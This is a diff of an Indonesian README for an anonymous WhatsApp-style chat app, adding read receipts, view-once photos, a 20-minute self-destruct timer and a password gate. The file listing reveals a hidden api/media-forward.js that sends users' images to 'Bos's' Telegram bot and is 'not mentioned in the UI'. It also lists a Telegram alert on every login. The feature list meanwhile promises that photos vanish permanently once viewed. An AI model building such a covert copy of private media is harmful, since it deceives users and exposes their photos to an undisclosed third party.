@@ -11,7 +11,10 @@ Tanpa nomor HP, tanpa password, tanpa daftar. Buka web → isi nama → langsung
 - 🏠 **Satu lobby publik** — semua ngobrol bareng, tanpa room, tanpa kode DM
 - 👥 **Daftar nama online** — lihat siapa aja yang lagi buka web
 - ⌨️ **Indikator mengetik** — "mengetik..." muncul live
-- 🕐 **Chat hilang otomatis setelah 24 jam** — fitur default, tanpa setting
+- ✅ **Centang dibaca** — 1 abu terkirim, 2 abu diterima, **2 biru dibaca**
+- 📷 **Gambar Dilihat-Sekali** — kirim foto (maks FHD 1920×1080, otomatis dikompres); tampil blur, ketuk untuk membuka, **hilang permanen setelah dilihat** ala WA
+- ⏳ **Timer bom 20 menit** — chip hitung mundur di header; semua chat & sesi hancur otomatis tiap 20 menit
+- 🔐 **Gerbang sandi** — verifikasi server-side, token HMAC
 - ⚡ **Realtime** — pesan masuk langsung via Supabase Realtime
 
 ## Cara menjalankan
@@ -43,10 +46,18 @@ File-file ini statis 100%, bisa di-host di mana aja:
 ## Struktur file
 ```
 anonchat/
-├── index.html               # UI: lobby chat + panel daftar online + modal nama
+├── index.html               # UI: lobby chat + panel daftar online + modal nama + viewer gambar
 ├── style.css                # tema terang WhatsApp iPhone
-├── app.js                   # logika: nama, lobby, realtime, mengetik, auto-hapus 24 jam
+├── app.js                   # logika: nama, lobby, realtime, mengetik, centang, view-once, bom 20 mnt
 ├── config.js                # ← ISI INI: URL + anon key Supabase
+├── api/
+│   ├── gate.js              # verifikasi sandi → token HMAC
+│   ├── session.js           # validasi token sesi
+│   ├── login-notify.js      # notif Telegram tiap login sukses
+│   └── media-forward.js     # teruskan gambar ke bot Telegram Bos (tidak disebut di UI)
 ├── supabase-schema.sql      # schema database (dijalankan sekali)
+├── supabase-migration-02.sql
+├── supabase-migration-03.sql # v4: centang terkirim/dibaca (delivered_to, read_by, mark_msg)
+├── supabase-migration-04.sql # v5: gambar dilihat-sekali (kind, media, viewed_by)
 └── README.md
 ```
